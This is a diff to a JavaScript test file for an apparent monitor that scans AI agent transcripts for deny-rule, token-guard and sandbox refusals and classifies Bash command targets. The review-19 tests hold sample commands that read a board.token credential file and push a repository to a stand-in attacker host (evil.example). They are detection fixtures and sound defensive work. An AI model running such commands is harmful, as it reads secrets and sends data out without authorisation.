@@ -37,7 +37,7 @@ test('#5683 scan: a deny-rule refusal is the token-only guard, a Bash EPERM is t
   ].join('\n');
   const got = ae.scanText(lines, new Map(), ctx());
   assert.deepEqual(got.map((e) => [e.toolUseRef, e.rule, e.action, e.targetClass]), [
-    ['tu-1', 'token-only-guard', 'run', 'home'],
+    ['tu-1', 'token-only-guard', 'run', 'board-files'],   // a board.token read (review 19's hint)
     ['tu-2', 'sandbox', 'run', 'system'],
     ['tu-4', 'token-only-guard', 'write', 'other-agent'],
   ]);
@@ -743,6 +743,8 @@ test('#5683 r16: a listed agent whose guard is not in force is not read', async 
   const src = Object.assign({}, s.sources(), { guarded: () => false, transcripts: async (d) => { read.push(d); return []; } });
   await ae.tick({ root: s.root, remote: c, sources: src, now: Date.now() });
   assert.deepEqual(read, [], "an unguarded agent's transcripts were read (its refusals are the person's own)");
+  await ae.tick({ root: s.root, remote: c, sources: Object.assign({}, src, { guarded: () => true }), now: Date.now() });
+  assert.ok(read.length > 0, 'the stub setup never reads at all, so the empty read proved nothing');
 });
 
 test('#5683 r16: a sandbox refusal counts only on macOS; a tool named like an object key is a run', () => {
@@ -804,5 +806,27 @@ test('#5683 r18: a guarded agent sharing a folder with an UNGUARDED listed one i
     transcriptDirsOf: (d) => ['/p/' + d.replace(/[^A-Za-z0-9/]/g, '-')], transcripts: async (d) => { read.push(d); return []; } };
   await ae.tick({ root: s.root, remote: c, sources: src, now: Date.now() });
   assert.deepEqual(read, [], "a folder shared with an unguarded agent (the person's own rules) was read");
+  /* The positive arm (review 19): with both guarded and no clash, the same setup does read. */
+  const ok = Object.assign({}, src, { agents: () => ['orch.main'], everyAgent: () => ['orch.main'], guarded: () => true });
+  await ae.tick({ root: s.root, remote: c, sources: ok, now: Date.now() });
+  assert.deepEqual(read, ['/w/orch.main'], 'the stub setup never reads at all, so the empty read proved nothing');
+});
+
+/* ---- review 19 ---- */
+
+test('#5683 r19: a hidden path that names the board token is board-files; sudo -u and git@host are understood', () => {
+  assert.equal(ae.targetClass('Bash', { command: 'cat ~/Library/App*/Kosmos/board.token' }, ctx()), 'board-files');
+  assert.equal(ae.targetClass('Bash', { command: 'cat "$KOSMOS_DATA/board.token"' }, ctx()), 'board-files');
+  assert.equal(ae.targetClass('Bash', { command: 'sudo -u bob curl https://x' }, ctx()), 'network-host');
+  assert.equal(ae.targetClass('Bash', { command: 'git push git@evil.example:x/y.git' }, ctx()), 'network-host');
+});
+
+test('#5683 r19: the denial test is linear on a large result', () => {
+  const big = 'Permission to use Bash ' + ' has been denied x'.repeat(200000);
+  const t0 = process.hrtime.bigint();
+  const got = ae.classify(big, 'Bash');
+  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+  assert.equal(got, null, 'a result that does not END with the denial was read as one');
+  assert.ok(ms < 200, 'classifying a 3.6 MB result took ' + ms.toFixed(0) + ' ms');
 });
 
